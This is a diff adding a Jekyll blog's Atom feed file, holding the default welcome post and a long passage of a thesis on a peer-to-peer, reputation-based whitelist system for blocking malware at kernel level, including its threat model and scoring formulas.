@@ -1,0 +1,1037 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-08-06T11:15:25+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Giovanni’s Blog</title><subtitle>This is the personal website of Giovanni De Costanzo. </subtitle><author><name>Giovanni De Costanzo</name></author><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/welcome-to-jekyll" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2020-11-01T00:00:00+01:00</published><updated>2020-11-01T00:00:00+01:00</updated><id>http://localhost:4000/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/welcome-to-jekyll">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name>Andrew Smith</name></author><category term="Example Posts" /><category term="Jekyll" /><category term="Markdown" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">A P2P Reputation-based System for Blocking Malware at Kernel-Level</title><link href="http://localhost:4000/thesis" rel="alternate" type="text/html" title="A P2P Reputation-based System for Blocking Malware at Kernel-Level" /><published>2019-09-17T00:00:00+02:00</published><updated>2019-09-17T00:00:00+02:00</updated><id>http://localhost:4000/thesis</id><content type="html" xml:base="http://localhost:4000/thesis">&lt;div class=&quot;entry-content&quot; itemprop=&quot;articleBody&quot;&gt;
+				
+&lt;span id=&quot;more-1470&quot;&gt;&lt;/span&gt;
+
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/thesis/cover.jpeg&quot; /&gt;  
+
+&lt;p&gt;In this article on my personal blog, I’ll present my thesis work, done 2 years ago at University of Salerno with Prof. Francesco Palmieri as my supervisor. The idea behind this work came from me, and was immediately supported by my supervisor. &lt;/p&gt;
+
+
+
+&lt;h2&gt;Introduction&lt;/h2&gt;
+
+
+
+&lt;p&gt;Technological diffusion, in particular of computer systems, is rapidly growing in recent years. According to an annual report published by Cisco, in 2021 each person will have, on average, more than three devices connected to the Internet. However, this growth is not associated with an adequate user awareness of computer security issues. In fact, as the number of devices on the network grew, the amount of sensitive data, online banking services and messaging systems also increased, attracting the attention of computer crime. In this scenario, the risk of fraud, digital theft and privacy violation is always around the corner and constantly keeps the experts busy, who try to find new countermeasures every time. Nowadays, one of the main issues in computer security is undoubtedly represented by &lt;em&gt;malware&lt;/em&gt;, a term which identifies any software created with the intention of causing several different types of damage within the system in which it is executed. The first malware has already spread since the 1980s. Over the years, malware have become more complex, so they can be classified into different categories, such as, worms, trojans, spyware, adware, rootkit, ransomware, etc. In particular, ransomware are having a great impact in the media. Consider for example the &lt;em&gt;WannaCry &lt;/em&gt;ransomware, which brought several organizations to their knees in various countries, demanding the payment of a ransom in Bitcoin. Another malware that has been much discussed in recent years is &lt;em&gt;Stuxnet&lt;/em&gt;, developed in 2009, considered one of the first cyber-weapons. It has been created to hinder the Iranian nuclear program. However, the spread of this malware was not controlled, and it began to infect also devices outside the nuclear plants. This case brings to our attention the fact that a malware is no longer a danger only for simple personal computers but could potentially trigger a cyber war. &lt;/p&gt;
+
+
+
+&lt;h4&gt;Contribution&lt;/h4&gt;
+
+
+
+&lt;p&gt;The existing security mechanisms and tools are not always effective in identifying or stopping the malware actions in a timely manner. In this work we design and implement a system that is able to block any malicious software, based on its reputation, before it can cause damage to the system. In the case of ransomware, in fact, it becomes of crucial importance to prevent the massive execution of the malicious payload, since most likely it would cause the loss of data on many victim devices. The main idea underlying our proposal is to create a robust and reliable collaborative system, based on a simple user reputation mechanism, which enables to collect reports concerning the &lt;em&gt;genuineness &lt;/em&gt;of a given software, with the aim of determining whether to allow its execution or not. &lt;/p&gt;
+
+
+
+&lt;p&gt;In detail, this work introduces a whitelist-based approach that, like other existing solutions, defines what is safe to execute, blocking everything else. It involves the use of a kernel module, operating at the runtime system level, that intercepts the system calls necessary for the execution of a file, verifying its reliability through a simple and lightweight but extremely robust reputation system available through a fully distributed interface. In detail, each executable file is identified within the system by a value calculated through a cryptographic hash function. Such a value will be used as a key within a &lt;em&gt;Kademlia Distributed Hash Table (DHT) &lt;/em&gt;that makes reliability scores available to individual runtime systems in a fully distributed and replicated way. Moreover, each executable is associated with a score, updated according to the reports made by registered voluntary users, that is used to classify such executable as &lt;em&gt;reliable &lt;/em&gt;or &lt;em&gt;malicious&lt;/em&gt;. Again, each contributing user has a reputation that varies based on the number of correct reports he made, and which determines the weight given to reports made by such user. We remark that in the proposed solution only a central entity can write on the Kademlia DHT nodes, collect the users’ reports and send the signed updated scores. Each runtime system can check the genuinity of such scores by verifying them through against a traditional Public Key Infrastructure (PKI). Experimental results show that the latency introduced by the proposed system is acceptable. &lt;/p&gt;
+
+
+
+&lt;h2&gt;Reputation systems and their problems&lt;/h2&gt;
+
+
+
+&lt;p&gt;The concept of &lt;em&gt;reputation &lt;/em&gt;concerns the credibility an individual has within a social community. Having a good reputation allows a person or a software to appear credible and reliable in the eyes of society. On the Internet, one of the main causes of bad reputation is the publication of false or inaccurate content, i.e., reports, reviews, etc. This is a serious problem, since almost anyone has the possibility to access the Web and publish, without any particular technical knowledge, false or untrusted material or false information. In recent years various attempts have been made to create systems capable of obtaining an automated estimate of the reputation of an entity in the Internet. Some common uses of these systems can be found on e-commerce websites, such as &lt;em&gt;eBay &lt;/em&gt;or &lt;em&gt;Amazon&lt;/em&gt;, or in online consulting communities, e.g., &lt;em&gt;Stack Exchange&lt;/em&gt;. Therefore, a reputation system allows users to evaluate each other within an online community, in order to build &lt;em&gt;trust through reputation&lt;/em&gt;. The fundamental idea is to allow the parties to evaluate each other, for example after the conclusion of a transaction, and to use the aggregated votes to obtain a &lt;em&gt;trust &lt;/em&gt;or &lt;em&gt;reputation score&lt;/em&gt;, which can help the other parties to decide whether or not to carry out transactions with that party in the future. A natural consequence of these systems is that they provide an incentive for good behavior, and therefore tend to have a positive effect on market quality. &lt;/p&gt;
+
+
+
+&lt;p&gt;Further areas in which reputation mechanisms find scope of
+application are the following:
+&lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt; Web search engines (e.g., &lt;em&gt;PageRank&lt;/em&gt;); &lt;/li&gt;&lt;li&gt; Developer community (e.g., &lt;em&gt;StackOverflow&lt;/em&gt;); &lt;/li&gt;&lt;li&gt; Internet security (e.g., &lt;em&gt;TrustedSource&lt;/em&gt;); &lt;/li&gt;&lt;li&gt; E-mail (e.g., &lt;em&gt;Vipul’s Razor&lt;/em&gt;, used for spam filtering); &lt;/li&gt;&lt;li&gt; Academia (e.g., &lt;em&gt;h-index &lt;/em&gt;of a researcher).&lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt;In order for a reputation system to work effectively, the following three properties must be strongly taken into account. In detail, each entity should:&lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt;Have a long life and create reliable expectations about future interactions; &lt;/li&gt;&lt;li&gt;Capture and distribute feedback on previous interactions; &lt;/li&gt;&lt;li&gt;Use feedback to drive trust. &lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt;These three properties are of paramount importance to build reliable reputations, and everything revolves around a fundamental element, which is &lt;em&gt;user’s feedback&lt;/em&gt;. We remark that although several attempts have been made to build reputation systems that are not based on feedback, in the state of the art the feedbacks still represent the basis of a reputation system. However, feedbacks may bring up three main problems: &lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt;Reluctance of users to provide feedback when this is not mandatory. If there is a large flow of interactions in an online community, but no feedback is collected, the trust and reputation environment cannot be formed; &lt;/li&gt;&lt;li&gt;To get negative feedback from users, who are conditioned by several factors, such as fear of retaliation. In fact, when feedback is not anonymous, many users are afraid of receiving a negative feedback in turn; &lt;/li&gt;&lt;li&gt;To elicit honest feedback from users. Although there is no concrete way to establish the truthfulness of honest feedback in a community, new users will be more likely to leave honest feedbacks. &lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt;Other pitfalls in reputation systems can include &lt;em&gt;identity change &lt;/em&gt;and &lt;em&gt;discrimination&lt;/em&gt;. Also in this case it is necessary to adjust user actions to obtain accurate and consistent feedbacks. &lt;/p&gt;
+
+
+
+&lt;h4&gt;Attacks on Reputation Systems&lt;/h4&gt;
+
+
+
+&lt;p&gt;Reputation systems are generally vulnerable to certain types of attacks, which can be classified based on the attacker’s goals. However, depending on the context and the type of attack, it is possible to apply proper defense mechanisms. The main attacks that can be directed towards a reputation system are the following: &lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt;Self-promoting Attack: the attacker increases his reputation in a distorted way. An example is the &lt;em&gt;Sybil Attack&lt;/em&gt;, where the attacker subverts the reputation system by creating a large number of pseudonyms and subsequently using them to gain a disproportionate influence. &lt;/li&gt;&lt;li&gt;Whitewashing Attack: some system vulnerabilities are exploited to update the reputation of a user. Other types of attacks can be combined with the whitewashing attack to make it more effective. &lt;/li&gt;&lt;li&gt;Slandering Attack: the attacker reports false data to lower the reputation of certain users. &lt;/li&gt;&lt;li&gt;Denial of Service Attack: this attack, by using Denial of Service (DoS) attacks, prevents the spread of reputation values in the systems. &lt;/li&gt;&lt;li&gt;Man in the Middle: an attacker could intercept the traffic and tamper with the feedback sent by other users. &lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;h2&gt;A Reputation-Based System for Malware Detection: A Technical Framework&lt;/h2&gt;
+
+
+
+&lt;p&gt;Current malware analysis techniques cannot deal with the action of new malicious software (i.e., &lt;em&gt;0-day&lt;/em&gt;), which has not yet been analyzed and detected. Therefore, it is clear that there is the need for preventive defense measures, to avoid the initiation of any harmful action within a system, as it could be the encryption of data by a ransomware. The main problem affecting most of the existing protection mechanisms is that they rely on a &lt;em&gt;negative-based model &lt;/em&gt;(&lt;em&gt;blacklist&lt;/em&gt;), that is, such mechanisms define what is dangerous, while implicitly letting everything else pass. Conversely, the main idea behind our proposal is to block, at the operating system level, the execution of any unknown software. The proposed system uses a &lt;em&gt;positive-based model &lt;/em&gt;(&lt;em&gt;whitelist&lt;/em&gt;), which defines what is allowed to pass, blocking everything else. Furthermore, we formulate a model for software classification, based on the “genuine” or “malicious” behaviors of the software. The proposed model allows the operating system to determine if it can execute a certain software. However, we remark that given the enormous amount of existing software, it is almost impossible to perform the classification by a single individual or a single entity. For this reason, the classification model we propose is based on &lt;em&gt;user collaboration&lt;/em&gt;. In this way, over time, entire communities of users can contribute to the software classification process, and this can be an invaluable support for the various companies that are involved in malware analysis.&lt;/p&gt;
+
+
+
+&lt;h4&gt;The Model&lt;/h4&gt;
+
+
+
+&lt;p&gt;In the proposed model, for each executable file, a hash value is calculated, by which this file will be uniquely identified within the system. Each unclassified executable file has an initial &lt;em&gt;reliability score &lt;/em&gt;value which is equal to 0. When the reliability score reaches a value greater than 1, then such executable is classified as &lt;em&gt;reliable&lt;/em&gt;; on the other hand, if the &lt;em&gt;reliability score &lt;/em&gt;value becomes less than −1, the evaluated executable is considered as &lt;em&gt;malicious&lt;/em&gt;. Thus, we have a “guard range” [−1, 1] in which we have no sufficient information to effectively trust its execution and need to ask the interested users for its permission to execute. The score of each executable file is determined by users registered to the system, who contribute by sending reports concerning the reliability of such file. Of course, such users may be human entities or automatic malware checkers operating on a specific host. &lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;1) Weaknesses and Improvements to the Basic Model: &lt;/strong&gt;&lt;/em&gt;It is necessary to make some considerations on the aforementioned basic model that could be vulnerable to several kind of attacks. For each of these attacks, we show how it can be mitigated or sometimes completely avoided. &lt;/p&gt;
+
+
+
+&lt;ul&gt;&lt;li&gt;Bad Mouthing Attack: A dishonest user could make incorrect reports to increase the score of a &lt;em&gt;malicious &lt;/em&gt;executable file or damage the score of a &lt;em&gt;reliable &lt;/em&gt;executable. To mitigate this issue, we introduce a &lt;em&gt;reputation model &lt;/em&gt;for registered users. In such a model, the reports are weighed based on the reputation of each user, which can increase or decrease depending on the number of correct or incorrect reports such user has given. However, we remark that a malicious user could decide to carry out a certain number of correct reports, in order to increase his reputation, before making a dishonest report. To discourage this behavior, users who make incorrect reports are penalized by the model, by decreasing their reputation in a proportional manner. This means that the higher the user’s reputation, the greater the decrease in the case of making an incorrect report. &lt;br /&gt;&lt;/li&gt;&lt;li&gt;Sybil Attack: Malicious users could subvert the system by registering to such system a disproportionate number of pseudonyms. It is important to point out that many users with a low reputation could still alter the score of an executable file. To overcome this problem, the user registration process makes use of digital certificates, issued by a &lt;em&gt;Certification Authority (CA) &lt;/em&gt;for the verification of user identity. This means that the system registration process is controlled, and no user will be able to register several times using different pseudonyms. &lt;br /&gt;&lt;/li&gt;&lt;li&gt;Man in the Middle Attack: An attacker could decide to intercept and tamper the reports of other users, for the purpose of altering the score of an executable file or damaging the reputation of an honest user. To prevent this type of attack, all the communication between the server that collects the reports and the users belonging to the system takes place by using encrypted connections. In addition, any store and lookup access to the P2P frontend repository is protected by digital signatures, ensuring integrity of all communications with Kademlia nodes. &lt;br /&gt;&lt;/li&gt;&lt;li&gt;Denial of Service Attack: Centralized systems are typically vulnerable to Denial of Service (DoS) attacks; distributed systems, on the other hand, are usually less vulnerable if sufficient redundancy is used, so that incorrect behavior, or the loss of some participants, will not affect the functioning of the entire system. Therefore, the proposed solution is based on a decentralized front-end architecture based on Kademlia P2P overlay that interfaces the kernel module performing runtime checks. Such interface is the most critical element potentially exposed to DoS, so that the use of a Kandemlia infrastructure for storing reliability information, can effectively mitigate the effects of these attacks. Indeed, the algorithm used by Kademlia nodes to record each other’s existence is able to resist to the most common DoS attacks. &lt;/li&gt;&lt;/ul&gt;
+
+
+
+&lt;p&gt;In light of these observations, we improve and extend the basic model described above, by providing it with a user reputation mechanism which works as follows. Each new user joining the system has an initial &lt;em&gt;reputation value &lt;/em&gt;equal to 0.5 and such a value can fluctuate from a minimum of 0 to a maximum of 1. Again, a user whose reputation falls below 0.01 will no longer be able to make reports. The reputation of each user is used to weigh the reports he made, that is, the more correct reports a user makes, the more his reputation grows; on the other hand, as the number of erroneous reports increases, the reputation of the user decreases. To determine whether the report concerning an executable file is correct or not, the overall score associated with such executable must reach a value that can be classified as &lt;em&gt;reliable &lt;/em&gt;or &lt;em&gt;malicious&lt;/em&gt;. For example, if the score related to an executable file becomes &lt;em&gt;reliable&lt;/em&gt;, all the users who have made a positive report for such file will see their reputation grow. On the contrary, users who have made a negative report, will see their reputation decrease. Moreover, once an executable file has been classified as &lt;em&gt;reliable &lt;/em&gt;or &lt;em&gt;malicious&lt;/em&gt;, subsequent reports made by other users will increase (or decrease) the score further but will not change the reputation of such users. We have made this choice since a malicious user could send positive reports for already classified executable files, in order to easily increase their reputation. We remark that the score related to an executable file is not updated immediately, upon the receipt of a single report made by a user, but at the end of a fixed time window. More precisely, the proposed system collects the reports received within a fixed time window and, when such a window expires, it calculates a weighted average which will be added to the executable file score. &lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;2) Formalization of the Improved Model: &lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;The model described above, operating according to a &lt;em&gt;time-slotted logic &lt;/em&gt;with fixed time slots of length &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt;, can be formalized as follows. Let &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt; be an executable file and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_%7Be%7D%28t%29+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_{e}(t) &quot; class=&quot;latex&quot; /&gt; the score associated with such file at the time &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+t+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; t &quot; class=&quot;latex&quot; /&gt;. Each new file &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt;, appearing at the time &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+t+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; t &quot; class=&quot;latex&quot; /&gt; has an initial score value equal to &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_%7Be%7D%28t%29+%3D+0+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_{e}(t) = 0 &quot; class=&quot;latex&quot; /&gt; and it will be classified as &lt;em&gt;reliable &lt;/em&gt;or &lt;em&gt;malicious&lt;/em&gt;, based on the values &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_%7Be%7D%28t%29+%3E+1+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_{e}(t) &amp;gt; 1 &quot; class=&quot;latex&quot; /&gt; and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_%7Be%7D%28t%29+%3C+-1+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_{e}(t) &amp;lt; -1 &quot; class=&quot;latex&quot; /&gt;, respectively. Again, let &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt; be a user joining the system and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+r_%7Bu%7D%28t%29+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; r_{u}(t) &quot; class=&quot;latex&quot; /&gt; the reputation value of such user at time &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+t+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; t &quot; class=&quot;latex&quot; /&gt;. Assuming the instant &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+t+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; t &quot; class=&quot;latex&quot; /&gt; as the moment when a user joins the system, we set &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+r_%7Bu%7D%28t%29+%3D+0.5+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; r_{u}(t) = 0.5 &quot; class=&quot;latex&quot; /&gt; for each new user &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt;. The reputation &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+r_%7Bu%7D%28t%29+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; r_{u}(t) &quot; class=&quot;latex&quot; /&gt; of a generic user &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt; may fluctuate within the interval &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5B0%2C1%5D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; [0,1] &quot; class=&quot;latex&quot; /&gt;, where &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+0+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; 0 &quot; class=&quot;latex&quot; /&gt; indicates that the user is totally unreliable and &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+1+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; 1 &quot; class=&quot;latex&quot; /&gt; the opposite. &lt;/p&gt;
+
+
+
+&lt;p&gt;Let &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt; denote a time window of a fixed duration. The system collects all the reports received for each executable file and, at the end of &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt;, it calculates a value representing the weighted average computed on all the reports for each executable &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt;.
+Finally, the system adds such a value to &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Csigma_%7Be%7D%28t%29+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \sigma_{e}(t) &quot; class=&quot;latex&quot; /&gt;.
+&lt;/p&gt;
+
+
+
+&lt;p&gt;Considering &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+s_u%5Ee+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; s_u^e &quot; class=&quot;latex&quot; /&gt; as the report relative to the executable file &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt;, sent by user &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt;, within the time window &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt;, &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+s_u%5Ee+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; s_u^e &quot; class=&quot;latex&quot; /&gt; can assume values of &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+1+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; 1 &quot; class=&quot;latex&quot; /&gt; or &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+-1+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; -1 &quot; class=&quot;latex&quot; /&gt; , in cases of positive (can execute) or negative
+(do not execute) reporting, respectively. We remark that a user
+&lt;img src=&quot;https://s0.wp.com/latex.php?latex=+u+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; u &quot; class=&quot;latex&quot; /&gt; can issue a single report &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+s_u%5Ee+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; s_u^e &quot; class=&quot;latex&quot; /&gt; within a time slot for each
+executable file &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt;, so that if multiple reports are generated for the same file during a time window &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt; occurring after the last update, the last report received overwrites the previous ones.
+&lt;/p&gt;
+
+
+
+&lt;p&gt;Again, the weighted average of the reports, relative to an
+executable file &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+e+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; e &quot; class=&quot;latex&quot; /&gt;, is calculated at the end of the window &lt;img src=&quot;https://s0.wp.com/latex.php?latex=+T+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; T &quot; class=&quot;latex&quot; /&gt; according to Eq. :
+&lt;/p&gt;
+
+
+
+&lt;p style=&quot;text-align:center&quot;&gt;&lt;img src=&quot;https://s0.wp.com/latex.php?latex=+%5Cmu_e+%3D+%5Cfrac+%7B%5Csum_%7B%5Cforall+u%7D+s_e%5Eu+r_u%28t%29%7D+%7Bn_e%7D+&amp;amp;bg=ffffff&amp;amp;fg=000&amp;amp;s=0&amp;amp;c=20201002&quot; alt=&quot; \mu_e = \frac {\sum_{\forall u} s_e^u r_u(t)} {n_e} &quot; class=&quot;latex&quot; /&gt;&lt;/p&gt;
+
+
+
